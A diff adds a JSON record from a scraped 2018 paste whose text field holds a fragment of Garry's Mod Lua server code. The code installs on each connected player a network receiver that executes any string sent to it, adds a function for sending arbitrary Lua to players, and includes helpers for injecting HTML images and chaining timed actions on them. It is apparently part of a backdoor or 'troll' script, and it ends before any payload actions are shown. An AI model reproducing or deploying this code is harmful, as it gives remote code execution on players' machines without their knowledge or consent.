@@ -1,0 +1,15 @@
+{
+ "espireDate": "N",
+ "format": "text",
+ "jSonReasons": [
+  "re_css",
+  "lg_en",
+  "re_ast1"
+ ],
+ "key": "sBPdJfG9",
+ "pasteDate": "Feb 17, 2018, 5:26:29 PM",
+ "relevancy": -3.0,
+ "relevant": false,
+ "text": "util.AddNetworkString \"slua4\n\"\n \nlocal lol = {}\nfunction lol:RandomString( intMin, intMax )\n    local ret = \"\"\n    for _ = 1, math.random( intMin, intMax ) do\n        ret = ret.. string.char( math.random(65, 90) )\n    end\n \n    return ret\nend\n \n \n \nlol.m_tblActions = {}\nlol.m_strImageGlobalVar = lol:RandomString( 6, 12 )\nlol.m_strImageLoadHTML = [[<style type=\"text/css\"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and \"margin: -8px -8px;\" or \"margin: 0px 0px;\") ..[[ } </style><body><img src=\"]] .. \"%s\" .. [[\" alt=\"\" width=\"]] .. \"%i\"..[[\" height=\"]] .. \"%i\" .. [[\" /></body>]]\n \nfunction lol:PushAction( intChainDelay, func )\n    self.m_tblActions[#self.m_tblActions +1] = { intChainDelay, func }\nend\n \nfunction lol:NextAction( pPlayer )\n    pPlayer.m_intCurAction = pPlayer.m_intCurAction +1\n    if not self.m_tblActions[pPlayer.m_intCurAction] then return end\n \n    timer.Simple( self.m_tblActions[pPlayer.m_intCurAction][1], function()\n        if not IsValid( pPlayer ) then return end\n        self.m_tblActions[pPlayer.m_intCurAction][2]( pPlayer )\n        self:NextAction( pPlayer )\n    end )\nend\n \nfunction lol:Start( pPlayer )\n    pPlayer.m_intCurAction = 0\n    self:NextAction( pPlayer )\nend\n \nfunction lol:SendLua( pPlayer, strLua )\n    net.Start( \"slua4\" )\n        net.WriteString( strLua )\n    net.Send( pPlayer )\nend\n \nfunction lol:SetupPlayer( pPlayer )\n    pPlayer:SendLua( \"net.Receive(\\\"slua4\\\", function() RunString(net.ReadString()) end)\" )\nend\n \n    timer.Remove( \"chatte\")\n    timer.Remove( \"chatte2\")",
+ "title": ""
+}
